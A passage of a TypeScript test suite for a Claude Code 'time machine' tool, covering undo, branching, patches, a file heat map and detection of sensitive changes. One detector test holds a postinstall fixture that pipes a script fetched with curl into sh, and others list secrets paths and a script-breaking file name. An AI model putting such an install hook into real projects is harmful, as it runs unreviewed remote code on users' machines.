    await put('src/auth.ts', 'A\nmine\n')
    const entry = await turn('feature', () => put('src/new.ts', 'new\n'))
    assert.ok(entry)
    const head = await sh('git', 'rev-parse', 'HEAD')
    const status = await sh('git', 'status', '--porcelain')
    const report = await tm.branchTo(entry.id, 'tm/feature')
    assert.equal(report.branch, 'tm/feature')
    assert.equal(await sh('git', 'rev-parse', 'HEAD'), head)
    assert.equal(await sh('git', 'status', '--porcelain'), status)
    assert.equal(await sh('git', 'show', 'tm/feature:src/auth.ts'), 'A\nmine\n')
    assert.equal(await sh('git', 'show', 'tm/feature:src/new.ts'), 'new\n')
    assert.equal(await sh('git', 'rev-parse', 'tm/feature^'), head)
    await assert.rejects(tm.branchTo(entry.id, 'tm/feature'), /already exists/)
    await assert.rejects(tm.branchTo(entry.id, 'bad..name'), /Not a valid branch name/)
  })

  test('/tm branch keeps tracked files the time machine never sees (.tmignore)', async () => {
    await put('data/big.csv', 'tracked data\n')
    await sh('git', 'add', 'data/big.csv')
    await sh('git', 'commit', '-qm', 'data')
    await put('.tmignore', 'data/\n')
    const entry = await turn('code', () => put('src/user.ts', 'v2\n'))
    assert.ok(entry)
    await tm.branchTo(entry.id, 'tm/code')
    assert.equal(await sh('git', 'show', 'tm/code:data/big.csv'), 'tracked data\n')
  })

  test('/tm patch applies to the project as it was before the turn', async () => {
    const entry = await turn('patchable', async () => {
      await put('src/user.ts', 'patched\n')
      await put('assets/blob.bin', new Uint8Array([0, 1, 2, 255]))
      await unlink(file('src/legacy.ts'))
    })
    assert.ok(entry)
    const patch = await tm.patch(entry.id)
    await tm.undo(entry.id)
    await writeFile(join(store, 'turn.patch'), patch)
    await sh('git', 'apply', join(store, 'turn.patch'))
    assert.equal(await read('src/user.ts'), 'patched\n')
    assert.deepEqual(new Uint8Array(await readFile(file('assets/blob.bin'))), new Uint8Array([0, 1, 2, 255]))
    assert.equal(await exists('src/legacy.ts'), false)
  })

  test('/tm commit and /tm branch work when the project is a subfolder of the repository', async () => {
    await put('pkg/app.ts', 'v1\n')
    await sh('git', 'add', '-A')
    await sh('git', 'commit', '-qm', 'pkg')
    tm = new TimeMachine(deps, join(root, 'pkg'), join(store, 'pkg.git'))
    await tm.init()
    const id = `turn-${++turns}`
    await tm.beginTurn(id, 'edit pkg', SESSION)
    await write('pkg/app.ts', 'v2\n')
    const entry = await tm.finishTurn(id, SESSION, false)
    assert.ok(entry)
    assert.deepEqual(entry.changes, [{ status: 'modified', path: 'app.ts' }])
    await tm.branchTo(entry.id, 'tm/pkg')
    assert.equal(await sh('git', 'show', 'tm/pkg:pkg/app.ts'), 'v2\n')
    assert.equal(await sh('git', 'show', 'tm/pkg:src/user.ts'), 'user\n')
    await tm.commitTo(entry.id, undefined, false)
    assert.equal((await sh('git', 'show', '--name-only', '--format=', 'HEAD')).trim(), 'pkg/app.ts')
  })
})

describe('the heat map', () => {
  test('counts Claude lines, later turns, undos and lines changed by others per file', async () => {
    const first = await turn('first', () => put('src/auth.ts', 'A\nB\nC\n'))
    await put('src/auth.ts', 'A\nB\nC\nmine\n')
    const second = await turn('second', async () => {
      await put('src/auth.ts', 'A\nB\nC\nmine\nD\n')
      await put('lib/util.ts', 'u\n')
    })
    const third = await turn('third', () => put('src/user.ts', 'user\nmore\n'))
    assert.ok(first && second && third)
    await tm.undo(third.id)

    const heat = await tm.heat()
    const byPath = new Map(heat.files.map(one => [one.path, one]))
    assert.equal(heat.turns, 3)
    assert.deepEqual(byPath.get('src/auth.ts'), {
      path: 'src/auth.ts',
      claude: 3,
      edits: 2,
      turns: 2,
      undos: 0,
      others: 1,
      turnIds: [second.id, first.id],
    })
    assert.equal(byPath.get('lib/util.ts')?.claude, 1)
    assert.equal(byPath.get('src/user.ts')?.undos, 1)
    assert.deepEqual(turnsOf(heat, 'src/auth.ts'), [second.id, first.id])

    const tree = heatTree(heat.files)
    assert.equal(tree.files, 3)
    assert.equal(nodeAt(tree, 'src')?.rework, 1)
    assert.equal(nodeAt(tree, 'src')?.claude, 4)
    assert.match(heatText(heat, 'rework', 5), /src\/auth\.ts\s+back in 1 later turn/)
    assert.match(heatText(heat, 'undo', 5), /src\/user\.ts\s+1 undo/)
  })

  test('only counts the window asked for', async () => {
    await turn('old', () => put('src/auth.ts', 'A\nB\n'))
    const heat = await tm.heat(Date.now() + 60_000)
    assert.deepEqual(heat.files, [])
    assert.equal(heat.turns, 0)
  })

  test('splits a batch whose output is cut off, and leaves out a single commit that still is', async () => {
    const big = await turn('big', () => put('src/auth.ts', 'A\nbig\n'))
    await turn('small', () => put('src/user.ts', 'user\nsmall\n'))
    assert.ok(big)
    const [bigStep = ''] = big.steps
    const cutting: Deps = {
      ...deps,
      exec: async (argv, init) => {
        const result = await deps.exec(argv, init)
        const isCut = argv.includes('--numstat') && (init.stdin ?? '').includes(bigStep)
        return isCut ? { ...result, stdout: result.stdout.slice(0, 10), isStdoutTruncated: true } : result
      },
    }
    tm.use(cutting)
    const heat = await tm.heat()
    tm.use(deps)
    assert.deepEqual(
      heat.files.map(one => one.path),
      ['src/user.ts'],
    )
  })
})

describe('the heat map drawing', () => {
  const file = (path: string, claude: number, others = 0): FileHeat => ({
    path,
    claude,
    edits: 1,
    turns: 1,
    undos: 0,
    others,
    turnIds: [],
  })
  const files = [file('src/app/a.ts', 40), file('src/app/b.ts', 10, 5), file('src/app/deep/c.ts', 5)]
  const heat: Heat = { files, turns: 2, since: 0 }

  test('squarify fills the rectangle without overlaps', () => {
    const rects = squarify([6, 6, 4, 3, 2, 2, 1], { x: 0, y: 0, w: 6, h: 4 })
    const area = rects.reduce((sum, r) => sum + r.w * r.h, 0)
    assert.ok(Math.abs(area - 24) < 1e-9)
    for (const r of rects) assert.ok(r.x >= -1e-9 && r.y >= -1e-9 && r.x + r.w <= 6 + 1e-9 && r.y + r.h <= 4 + 1e-9)
    for (const [i, a] of rects.entries()) {
      for (const b of rects.slice(i + 1)) {
        const overlap =
          Math.max(0, Math.min(a.x + a.w, b.x + b.w) - Math.max(a.x, b.x)) *
          Math.max(0, Math.min(a.y + a.h, b.y + b.h) - Math.max(a.y, b.y))
        assert.ok(overlap < 1e-9)
      }
    }
  })

  test('a folder of one folder is skipped on the way down and on the way up', () => {
    const tree = heatTree(files)
    const top = viewOf(tree, heat, { path: '', metric: 'churn', from: null })
    assert.equal(top.path, 'src/app')
    assert.equal(top.parent, null)
    assert.deepEqual(
      top.nodes.map(node => node.name),
      ['a.ts', 'b.ts', 'deep'],
    )
    assert.equal(top.nodes[0]?.children, undefined)
    const deep = viewOf(tree, heat, { path: 'src/app/deep', metric: 'rework', from: 5 })
    assert.equal(deep.parent, 'src/app')
    assert.equal(deep.from, 5)
  })

  test('terminal cells are whole triplets with the labels in them', () => {
    const view = viewOf(heatTree(files), heat, { path: '', metric: 'churn', from: null })
    const bytes = Buffer.from(rasterCells(view.nodes, 'churn', 40, 8), 'base64')
    assert.equal(bytes.length, 40 * 8 * 12)
    const words = new Uint32Array(bytes.buffer, bytes.byteOffset, bytes.length / 4)
    const text = Array.from({ length: 40 * 8 }, (_, i) => String.fromCodePoint(words[i * 3] ?? 32)).join('')
    assert.match(text, /a\.ts/)
  })

  test('the page runs the same layout, colors and labels as the pane', () => {
    const context = vm.createContext({})
    vm.runInContext(
      `${pageLibrary()}\nglobalThis.lib = { squarify, heatColor, valueLabel, describe, intensity }`,
      context,
    )
    const lib = context.lib as Record<string, (...args: unknown[]) => unknown>
    const tree = heatTree(files)
    const rect = { x: 0, y: 0, w: 300, h: 200 }
    assert.deepEqual(JSON.parse(JSON.stringify(lib.squarify?.([5, 3, 1], rect))), squarify([5, 3, 1], rect))
    assert.equal(lib.heatColor?.(0.7, 'churn'), heatColor(0.7, 'churn'))
    assert.equal(lib.describe?.(tree), describeNode(tree))
    assert.equal(lib.valueLabel?.(tree, 'owner', METRIC_UNITS), valueLabel(tree, 'owner', METRIC_UNITS))
  })

  test('no file name can break out of the page', () => {
    const tree = heatTree([file('x/</script><b>.ts', 3), file('y/\u2028.ts', 1)])
    const page = heatPage({ project: '/work/p', tree, turns: 1, since: 0, made: 0 })
    assert.equal(page.match(/<\/script>/g)?.length, 1)
    assert.doesNotMatch(page, /\u2028/)
    assert.doesNotMatch(page, /(src|href)="https?:/)
  })
})

describe('sensitive changes', () => {
  test('flags paths by what they are', () => {
    const kinds = Object.fromEntries(
      [
        '.github/workflows/ci.yml',
        'ci/Jenkinsfile',
        '.husky/pre-commit',
        'web/package-lock.json',
        'requirements-dev.txt',
        '.env',
        '.env.production',
        '.env.example',
        'certs/server.key',
        'docker/Dockerfile.prod',
        'compose.yaml',
        'infra/main.tf',
        'src/app.ts',
        'docs/environment.md',
      ].map(path => [path, kindOfPath(path) ?? null]),
    )
    assert.deepEqual(kinds, {
      '.github/workflows/ci.yml': 'ci',
      'ci/Jenkinsfile': 'ci',
      '.husky/pre-commit': 'hooks',
      'web/package-lock.json': 'deps',
      'requirements-dev.txt': 'deps',
      '.env': 'secrets',
      '.env.production': 'secrets',
      '.env.example': null,
      'certs/server.key': 'secrets',
      'docker/Dockerfile.prod': 'container',
      'compose.yaml': 'container',
      'infra/main.tf': 'infra',
      'src/app.ts': null,
      'docs/environment.md': null,
    })
  })

  test('reads dependencies and install scripts out of package.json', () => {
    const before = JSON.stringify({ dependencies: { react: '^18', lodash: '^4' }, scripts: { test: 'node --test' } })
    const after = JSON.stringify({
      version: '2.0.0',
      dependencies: { react: '^19', 'left-pad': '^1' },
      scripts: { test: 'node --test', postinstall: 'curl https://example.com/x.sh | sh' },
    })
    assert.deepEqual(manifestChanges(before, after), {
      dependencies: ['react ^18→^19', '+left-pad', '-lodash'],
      scripts: ['postinstall: curl https://example.com/x.sh | sh'],
    })
    assert.deepEqual(manifestChanges(before, before), { dependencies: [], scripts: [] })
    assert.equal(manifestChanges('{ not json', after), undefined)
  })

  test('a version bump alone is not flagged; a broken package.json is', () => {
    const manifest = (version: string) => JSON.stringify({ version, dependencies: { a: '1' } })
    const fact = { path: 'package.json', isDeleted: false, modeBefore: '100644', modeAfter: '100644' }
    assert.deepEqual(assess([{ ...fact, manifest: { before: manifest('1'), after: manifest('2') } }]), [])
    assert.deepEqual(assess([{ ...fact, manifest: { before: manifest('1'), after: '{' } }]), [
      { kind: 'deps', paths: ['package.json'], items: [] },
    ])
  })

  test('sums findings up in one line', () => {
    const line = alertLine([
      { kind: 'ci', paths: ['.github/workflows/ci.yml'], items: [] },
      { kind: 'deps', paths: ['package.json'], items: ['+a', '+b', '-c'] },
      { kind: 'deps', paths: ['package-lock.json'], items: [] },
      { kind: 'secrets', paths: ['config/.env'], items: [] },
      { kind: 'mass-delete', paths: Array.from({ length: 25 }, (_, i) => `f${i}`), items: [] },
    ])
    assert.equal(line, 'CI config · deps +a +b +1 more · .env · 25 files deleted')
  })

  test("flags a turn's CI, dependency, install script and executable changes, made through any tool", async () => {
    await put('package.json', JSON.stringify({ name: 'x', dependencies: { react: '^18' } }, null, 2))
    await put('scripts/setup.sh', 'echo setup\n')
    const entry = await turn('ship it', async () => {
      await put('src/user.ts', 'user v2\n')
      await put('.github/workflows/ci.yml', 'on: push\n')
      await put(
        'package.json',
        JSON.stringify(
          { name: 'x', dependencies: { react: '^18', 'left-pad': '^1' }, scripts: { postinstall: 'sh x.sh' } },
          null,
          2,
        ),
      )
      await chmod(file('scripts/setup.sh'), 0o755)
    })
    assert.ok(entry)
    const findings = await tm.findings(entry.id)
    assert.deepEqual(findings, [
      { kind: 'ci', paths: ['.github/workflows/ci.yml'], items: [] },
      { kind: 'deps', paths: ['package.json'], items: ['+left-pad'] },
      { kind: 'install-script', paths: ['package.json'], items: ['postinstall: sh x.sh'] },
      { kind: 'executable', paths: ['scripts/setup.sh'], items: [] },
    ])
    assert.match(findingLines(findings).join('\n'), /⚠ install script\s+package\.json {2}postinstall: sh x\.sh/)

    const done = await tm.undoSensitive(entry.id)
    assert.ok(done)
    assert.equal(await exists('.github/workflows/ci.yml'), false)
    assert.doesNotMatch(await read('package.json'), /left-pad|postinstall/)
    assert.equal(((await stat(file('scripts/setup.sh'))).mode & 0o111) === 0, true)
    assert.equal(await read('src/user.ts'), 'user v2\n')
  })

  test('flags a mass delete and brings the files back on its own', async () => {
    for (let i = 0; i < 25; i++) await put(`old/file${i}.ts`, `${i}\n`)
    const entry = await turn('clean up', async () => {
      await rm(file('old'), { recursive: true })
      await put('src/user.ts', 'tidy\n')
    })
    assert.ok(entry)
    const [finding] = await tm.findings(entry.id)
    assert.equal(finding?.kind, 'mass-delete')
    assert.equal(finding?.paths.length, 25)
    const done = await tm.undoSensitive(entry.id)
    assert.equal(done?.recovered.length, 25)
    assert.equal(await read('old/file7.ts'), '7\n')
    assert.equal(await read('src/user.ts'), 'tidy\n')
  })

  test('an ordinary turn flags nothing, and undoing its sensitive part does nothing', async () => {
    const entry = await turn('edit', () => put('src/user.ts', 'plain\n'))
    assert.ok(entry)
    assert.deepEqual(await tm.findings(entry.id), [])
    assert.equal(await tm.undoSensitive(entry.id), undefined)
    assert.equal(await read('src/user.ts'), 'plain\n')
  })
})

describe('the Claude Code version', () => {
  test('2.1.287 and newer pass; older, or too old to say, get told to update', () => {
    assert.equal(versionProblem('2.1.287'), undefined)
    assert.equal(versionProblem('2.1.300-dev'), undefined)
    assert.equal(versionProblem('2.2.0'), undefined)
    assert.equal(versionProblem('3.0.1'), undefined)
    assert.equal(versionProblem('custom-build'), undefined)
    assert.match(versionProblem('2.1.286') ?? '', /needs Claude Code 2\.1\.287 or newer; this is 2\.1\.286/)
    assert.match(versionProblem('1.9.999') ?? '', /this is 1\.9\.999/)
    assert.match(
      versionProblem(undefined) ?? '',
      /needs Claude Code 2\.1\.287 or newer\. Update it with: claude update/,
    )
  })
})

describe('the band', () => {
  const summary = (modified: number, added: number, deleted: number) =>
    turnSummary({ counts: { added, modified, deleted } } as Parameters<typeof turnSummary>[0])

  test('says what a turn did in a sentence', () => {
    assert.equal(summary(3, 12, 4), 'Claude edited 3 files, created 12 and deleted 4')
    assert.equal(summary(2, 0, 1), 'Claude edited 2 files and deleted 1')
    assert.equal(summary(0, 1, 0), 'Claude created 1 file')
    assert.equal(summary(0, 0, 5), 'Claude deleted 5 files')
    assert.equal(summary(1, 2, 0), 'Claude edited 1 file and created 2')
    assert.equal(summary(0, 0, 0), 'Claude changed only files the time machine leaves out')
  })

  test('says what an undo did in a sentence', () => {
    const files = (count: number) => Array.from({ length: count }, (_, i) => `f${i}`)
    const report = (restored: number, removed: number, recovered: number, unchanged = 0) => ({
      restored: files(restored),
      removed: files(removed),
      recovered: files(recovered),
      unchanged: files(unchanged),
      unsettled: [],
      drift: '',
      conflicts: [],
      entry: undefined,
    })
    assert.equal(restoreText(report(3, 12, 4), 'abc1234'), '✓ Restored 3 files, removed 12 and brought back 4')
    assert.equal(restoreText(report(0, 2, 1), 'abc1234'), '✓ Removed 2 files and brought back 1')
    assert.equal(restoreText(report(1, 0, 0, 2), 'abc1234'), '✓ Restored 1 file\n· 2 files were already back')
    assert.equal(restoreText(report(0, 0, 0), 'abc1234'), 'Nothing to change: the files are already there.')
  })
})

describe('times and titles', () => {
  test('a time ago in seconds, minutes, hours or days', () => {
    assert.equal(ago(2_000), 'just now')
    assert.equal(ago(42_000), '42s ago')
    assert.equal(ago(5 * 60_000 + 30_000), '5m ago')
    assert.equal(ago(3 * 3_600_000), '3h ago')
    assert.equal(ago(12 * 86_400_000), '12d ago')
  })

  test('a long prompt is cut at a word, with an ellipsis', () => {
    const prompt = 'Delete the legacy module and every test that still imports it. Answer in one line please, thanks'
    assert.equal(firstLine(prompt), 'Delete the legacy module and every test that still imports it. Answer in one…')
    assert.equal(firstLine('\n  short prompt  \nmore'), 'short prompt')
  })
})
